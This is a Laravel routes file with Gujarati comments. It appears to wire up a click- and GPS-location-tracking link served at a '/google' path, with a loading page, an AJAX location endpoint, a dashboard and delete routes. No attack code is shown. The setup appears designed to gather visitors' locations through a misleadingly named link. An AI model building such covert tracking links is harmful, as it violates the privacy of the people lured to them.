<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TrackController;

// મેઈન પેજ
Route::get('/', function () {
    return "App Working";
});

// ૧. ટ્રેકિંગ માટેનો રૂટ
// યુઝર આ લિંક ખોલશે એટલે TrackController નો track ફંક્શન લોડિંગ પેજ બતાવશે
Route::get('/google', [TrackController::class, 'track'])->name('track');

// ૨. GPS લોકેશન અપડેટ કરવા માટેનો નવો રૂટ (નવી ફિક્સ)
// આ રૂટ JavaScript (AJAX) દ્વારા ડેટા લેવા માટે વપરાશે
Route::post('/update-location', [TrackController::class, 'updateLocation'])->name('location.update');

// ૩. ડેશબોર્ડ રૂટ
Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');

// ૪. સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');

// ૫. બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');
